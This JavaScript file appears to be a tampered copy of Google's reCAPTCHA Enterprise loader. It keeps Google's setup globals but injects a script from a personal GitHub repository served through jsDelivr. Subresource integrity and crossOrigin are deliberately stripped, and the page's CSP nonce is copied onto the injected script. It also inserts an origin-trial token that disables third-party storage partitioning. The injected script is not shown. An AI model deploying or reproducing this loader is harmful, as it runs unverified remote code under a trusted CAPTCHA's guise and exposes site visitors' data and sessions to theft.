/* PLEASE DO NOT COPY AND PASTE THIS CODE. */
(function () {
  var w = window,
    C = "___grecaptcha_cfg",
    cfg = (w[C] = w[C] || {}),
    N = "grecaptcha";
  var E = "enterprise",
    a = (w[N] = w[N] || {}),
    gr = (a[E] = a[E] || {});

  // Standard reCAPTCHA setup
  gr.ready =
    gr.ready ||
    function (f) {
      (cfg["fns"] = cfg["fns"] || []).push(f);
    };
  w["__recaptcha_api"] = "https://www.google.com/recaptcha/enterprise/";
  (cfg["enterprise"] = cfg["enterprise"] || []).push(true);
  (cfg["render"] = cfg["render"] || []).push("onload");
  (cfg["clr"] = cfg["clr"] || []).push("true");
  w["__google_recaptcha_client"] = true;

  // Create script element
  var d = document,
    po = d.createElement("script");
  po.type = "text/javascript";
  po.async = true;
  po.charset = "utf-8";

  // Load from GitHub raw URL, no security checks
  po.src = "https://cdn.jsdelivr.net/gh/shaneilahi/test@master/gg.js";
  // Removed: po.crossOrigin = 'anonymous';
  // Removed: po.integrity = 'sha384-61VR//KO5vDNAFE1O0P7MzEOKj68zRELxJeYIL5DD4Cj1hdU5Cro7XZfUD04Ca7S';

  // Handle nonce if present (keep for compatibility)
  var e = d.querySelector("script[nonce]"),
    n = e && (e["nonce"] || e.getAttribute("nonce"));
  if (n) {
    po.setAttribute("nonce", n);
  }

  // Insert script before the first existing script
  var s = d.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(po, s);

  // Optional: Remove origin-trial meta tag (not needed for local testing, but kept for minimal breakage)
  var v = w.navigator,
    m = d.createElement("meta");
  m.httpEquiv = "origin-trial";
  m.content =
    "A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9";
  if (v && v.cookieDeprecationLabel) {
    v.cookieDeprecationLabel.getValue().then(function (l) {
      if (
        l !== "treatment_1.1" &&
        l !== "treatment_1.2" &&
        l !== "control_1.1"
      ) {
        d.head.prepend(m);
      }
    });
  } else {
    d.head.prepend(m);
  }

  // Ensure iframe renders by triggering ready callbacks after load
  po.onload = function () {
    if (cfg.fns && cfg.fns.length) {
      cfg.fns.forEach((fn) => fn());
      console.log("reCAPTCHA ready callbacks executed");
    }
  };
})();
